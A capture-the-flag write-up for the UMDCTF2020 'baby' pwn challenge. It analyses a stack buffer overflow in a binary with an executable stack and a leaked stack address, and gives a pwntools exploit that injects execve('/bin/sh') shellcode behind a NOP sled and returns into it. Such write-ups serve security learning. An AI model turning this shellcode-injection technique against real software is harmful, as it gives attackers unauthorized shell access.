
## baby
### Description

> The mitigations have left the room.. 
>
> `nc 142.93.113.134 9999` 
>
> Author: `moogboi`


### Attachment

[baby](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/UMDCTF2020/pwn/baby/baby)

### Analysis

```bash
% checksec baby 
[*] '/home/taqini/Downloads/UMDCTF/baby/baby'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

We know the address of `s` in stack and stack is executable, so just need to put our shellcode into `s` in stack and return to `s` by stack overflow.

```c
int __cdecl main(int argc, const char **argv, const char **envp){
  char s; // [rsp+0h] [rbp-80h]

  setbuf(stdout, 0LL);
  printf("Is this an... executable stack? %llx\n", &s);
  fgets(&s, 4919, stdin);
  return 0;
}
```

### Solution

```python
offset = 136
payload = asm('''
    /* execve(path='/bin/sh', argv=0, envp=0) */
    /* push '/bin/sh\x00' */
    mov rax, 0x101010101010101
    push rax
    mov rax, 0x101010101010101 ^ 0x68732f6e69622f
    xor [rsp], rax
    mov rdi, rsp
    xor edx, edx /* 0 */
    xor esi, esi /* 0 */
    /* call execve() */
    mov rax, SYS_execve /* 0x3b */
    syscall
    ''')
payload = payload.rjust(offset,'\x90')
ru('Is this an... executable stack? ')
stack = eval('0x'+rc(12))
info_addr('stack',stack)
payload += p64(stack)
# debug('b *0x400628')
sl(payload)
```


### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/UMDCTF2020/pwn/baby) 


